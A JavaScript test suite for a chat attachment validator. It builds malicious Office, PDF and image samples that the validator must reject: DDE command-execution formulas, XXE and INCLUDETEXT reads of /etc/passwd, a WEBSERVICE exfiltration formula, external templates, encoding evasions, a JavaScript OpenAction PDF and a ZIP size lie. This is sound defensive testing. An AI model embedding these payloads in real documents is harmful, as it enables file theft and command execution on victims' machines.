import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm, readFile, readdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { promisify } from 'node:util';
import { execFile } from 'node:child_process';
import { deflateRawSync } from 'node:zlib';
import sharp from 'sharp';
import { createAttachmentStore, validateOffice } from '../src/chat/attachments.mjs';
const run = promisify(execFile);
export function pdf(active = false) {
  const objects = ['<< /Type /Catalog /Pages 2 0 R' + (active ? ' /OpenAction 4 0 R' : '') + ' >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>', ...(active ? ['<< /S /Java#53cript /JS (app.alert\(1\)) >>'] : [])];
  let text = '%PDF-1.4\n'; const offsets = [0];
  objects.forEach((object, index) => { offsets.push(Buffer.byteLength(text)); text += `${index + 1} 0 obj\n${object}\nendobj\n`; });
  const xref = Buffer.byteLength(text); text += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n` + offsets.slice(1).map(offset => String(offset).padStart(10, '0') + ' 00000 n \n').join('');
  text += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`; return Buffer.from(text);
}
function crc32(buffer) { let c = 0xffffffff; for (const b of buffer) { c ^= b; for (let bit = 0; bit < 8; bit++) c = (c >>> 1) ^ ((c & 1) ? 0xedb88320 : 0); } return (c ^ 0xffffffff) >>> 0; }
export function zip(entries, { compress = false, claimedSizes = {} } = {}) {
  const files = [], directory = []; let offset = 0;
  for (const [name, text] of Object.entries(entries)) {
    const filename = Buffer.from(name), source = Buffer.from(text), data = compress ? deflateRawSync(source) : source, local = Buffer.alloc(30), central = Buffer.alloc(46), crc = crc32(source), expanded = claimedSizes[name] ?? source.length;
    local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20, 4); local.writeUInt16LE(compress ? 8 : 0, 8); local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(expanded, 22); local.writeUInt16LE(filename.length, 26);
    central.writeUInt32LE(0x02014b50); central.writeUInt16LE(20, 4); central.writeUInt16LE(20, 6); central.writeUInt16LE(compress ? 8 : 0, 10); central.writeUInt32LE(crc, 16); central.writeUInt32LE(data.length, 20); central.writeUInt32LE(expanded, 24); central.writeUInt16LE(filename.length, 28); central.writeUInt32LE(offset, 42);
    files.push(local, filename, data); directory.push(central, filename); offset += local.length + filename.length + data.length;
  }
  const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50); end.writeUInt16LE(directory.length / 2, 8); end.writeUInt16LE(directory.length / 2, 10); end.writeUInt32LE(Buffer.concat(directory).length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...files, ...directory, end]);
}
export function office(extension = 'docx', extra = {}, zipOptions = {}) {
  const part = extension === 'docx' ? 'word/document.xml' : 'xl/workbook.xml';
  const type = extension === 'docx' ? 'wordprocessingml.document' : 'spreadsheetml.sheet';
  return zip({
    '[Content_Types].xml': `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/${part}" ContentType="application/vnd.openxmlformats-officedocument.${type}.main+xml"/></Types>`,
    '_rels/.rels': `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="${part}"/></Relationships>`,
    [part]: extension === 'docx' ? '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Договор</w:t></w:r></w:p></w:body></w:document>' : '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets/></workbook>',
    ...extra,
  }, zipOptions);
}
test('Chat documents validate bounded OOXML packages, reject spoofing, macros, external templates and traversal', async () => {
  await validateOffice(office(), 'docx'); await validateOffice(office('xlsx'), 'xlsx');
  await assert.rejects(validateOffice(office(), 'xlsx'), { status: 422 });
  await assert.rejects(validateOffice(Buffer.from('not zip'), 'docx'), { status: 422 });
  for (const extra of [
    { '../outside.xml': '<x/>' }, { 'word/vbaProject.bin': 'macro' }, { 'word/activeX/a.xml': '<x/>' },
    { 'word/settings.xml': '<!DOCTYPE x [<!ENTITY y SYSTEM "file:///etc/passwd">]><x/>' },
    { 'word/_rels/document.xml.rels': '<Relationships><Relationship TargetMode="External" Type="attachedTemplate" Target="https://example.invalid/template"/></Relationships>' },
  ]) await assert.rejects(validateOffice(office('docx', extra), 'docx'), { status: 422 });
});

test('OOXML rejects namespace, character-reference and UTF-16 active-content evasions', async () => {
  const external = '<r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships"><r:Relationship TargetMode="External" Type="attachedTemplate" Target="https://example.invalid/template"/></r:Relationships>';
  for (const value of [external, Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(external, 'utf16le')])]) {
    await assert.rejects(validateOffice(office('docx', { 'word/_rels/document.xml.rels': value }), 'docx'), { status: 422 });
  }
  for (const type of ['package', 'aFChunk', 'oleObject', 'attachedTemplate', 'control']) {
    await assert.rejects(validateOffice(office('docx', { 'word/_rels/document.xml.rels': `<r:Relationships xmlns:r="urn:test"><r:Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="otherwise-innocent.bin"/></r:Relationships>`, 'word/otherwise-innocent.bin': 'nested package' }), 'docx'), { status: 422 });
  }
  for (const extra of [
    { 'xl/macrosheets/sheet1.xml': '<worksheet/>' },
    { 'xl/suspicious.xml': '<x:Override xmlns:x="urn:test" ContentType="application/vnd.ms-excel.ma&#99;rosheet+xml"/>' },
    { 'xl/worksheets/sheet1.xml': '<worksheet><f>WEBSER&#86;ICE("https://example.invalid/leak")</f></worksheet>' },
    { 'xl/worksheets/sheet1.xml': '<s:worksheet xmlns:s="urn:test"><s:f>cmd|\' /C calc\'!A0</s:f></s:worksheet>' },
    { 'xl/worksheets/sheet1.xml': '<worksheet><f>\'[secret.xlsx]Sheet1\'!A1</f></worksheet>' },
    { 'xl/workbook.xml': '<workbook><definedNames><definedName name="run">_xlfn.RTD("server",,1)</definedName></definedNames></workbook>' },
  ]) await assert.rejects(validateOffice(office('xlsx', extra), 'xlsx'), { status: 422 });
  for (const content of [
    '<w:document xmlns:w="urn:test"><w:instrText>DD</w:instrText><w:instrText>EAUTO cmd /c calc</w:instrText></w:document>',
    '<w:document xmlns:w="urn:test"><w:fldSimple w:instr="INCLUDETE&#88;T file:///etc/passwd"/></w:document>',
  ]) await assert.rejects(validateOffice(office('docx', { 'word/document.xml': content }), 'docx'), { status: 422 });
});

test('OOXML accepts normal formulas, tables, HTTPS hyperlinks, prefixes and UTF-16 text', async () => {
  await validateOffice(office('xlsx', { 'xl/worksheets/sheet1.xml': '<worksheet><f>SUM(A1:A10)</f><f>SUM(Table1[Volume])</f><f>IF(B1&gt;10,1,0)</f></worksheet>' }), 'xlsx');
  await validateOffice(office('docx', {
    'word/document.xml': Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<a:document xmlns:a="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><a:body><a:p><a:r><a:t>Договор</a:t></a:r></a:p></a:body></a:document>', 'utf16le')]),
    'word/_rels/document.xml.rels': '<r:Relationships xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships"><r:Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" TargetMode="External" Target="https://example.com"/></r:Relationships>',
  }), 'docx');
});

test('OOXML verifies actual binary-resource expansion instead of trusting ZIP metadata', async () => {
  const extra = { 'word/media/image.bin': Buffer.alloc(1024 * 1024, 65) };
  await validateOffice(office('docx', extra, { compress: true }), 'docx');
  await assert.rejects(validateOffice(office('docx', extra, { compress: true, claimedSizes: { 'word/media/image.bin': 1 } }), 'docx'), { status: 422 });
});

test('Chat images are reencoded, rotated, metadata stripped, bounded and stored under server IDs', async () => {
  const dir = await mkdtemp(tmpdir() + '/egin-chat-media-'); const store = createAttachmentStore(dir);
  try {
    const jpeg = await sharp({ create: { width: 2400, height: 1200, channels: 3, background: '#214d36' } }).jpeg().withMetadata({ orientation: 6 }).toBuffer();
    const image = await store.save(jpeg, { kind: 'image', name: '../../field.jpg' });
    assert.equal(image.mimeType, 'image/webp'); assert.equal(image.height, 1800); assert.equal(image.width, 900); assert.equal(image.name, 'field.webp');
    const meta = await sharp(await readFile(store.path(image.storageKey))).metadata(); assert.equal(meta.exif, undefined);
    assert.equal((await sharp(store.path(image.storageKey, { thumbnail: true })).metadata()).height, 480);
    await assert.rejects(store.save(Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>'), { kind: 'image', name: 'fake.png' }), { status: 422 });
    await assert.rejects(store.save(Buffer.alloc(11 * 1024 * 1024), { kind: 'image', name: 'big.jpg' }), { status: 413 });
    assert.throws(() => store.path('../secret'), { status: 404 });
    await store.remove(image.storageKey); assert.deepEqual(await readdir(dir + '/chat-attachments'), []);
  } finally { await rm(dir, { recursive: true, force: true }); }
});

test('Chat PDF/audio are inspected by actual qpdf/ffmpeg; active content and fake audio rejected', { skip: !process.env.CHAT_MEDIA_TESTS }, async () => {
  const dir = await mkdtemp(tmpdir() + '/egin-chat-codecs-'); const store = createAttachmentStore(dir);
  try {
    const document = await store.save(pdf(), { kind: 'document', name: 'Договор.pdf' }); assert.equal(document.mimeType, 'application/pdf');
    await assert.rejects(store.save(pdf(true), { kind: 'document', name: 'active.pdf' }), { status: 422 });
    await assert.rejects(store.save(Buffer.from('%PDF-1.7\nnot really PDF'), { kind: 'document', name: 'fake.pdf' }), { status: 422 });
    await assert.rejects(store.save(Buffer.from('RIFFnot audio'), { kind: 'audio', name: 'voice.wav' }), { status: 422 });
    await run('ffmpeg', ['-v', 'error', '-f', 'lavfi', '-i', 'sine=frequency=440:duration=1', '-c:a', 'libopus', dir + '/voice.webm']);
    const audio = await store.save(await readFile(dir + '/voice.webm'), { kind: 'audio', name: 'voice.webm' });
    assert.equal(audio.mimeType, 'audio/mp4'); assert.ok(audio.duration >= 0.9 && audio.duration < 1.2); assert.ok(audio.size < 20000);
    await run('ffmpeg', ['-v', 'error', '-f', 'lavfi', '-i', 'anullsrc=r=8000:cl=mono', '-t', '183', '-c:a', 'libopus', dir + '/long.ogg']);
    await assert.rejects(store.save(await readFile(dir + '/long.ogg'), { kind: 'audio', name: 'long.ogg' }), { status: 422 });
    const doc = await store.save(office(), { kind: 'document', name: 'Договор.docx' }); assert.match(doc.mimeType, /wordprocessingml/);
    assert.ok(!(await readdir(dir + '/chat-attachments')).some(name => name.endsWith('.input')));
  } finally { await rm(dir, { recursive: true, force: true }); }
});
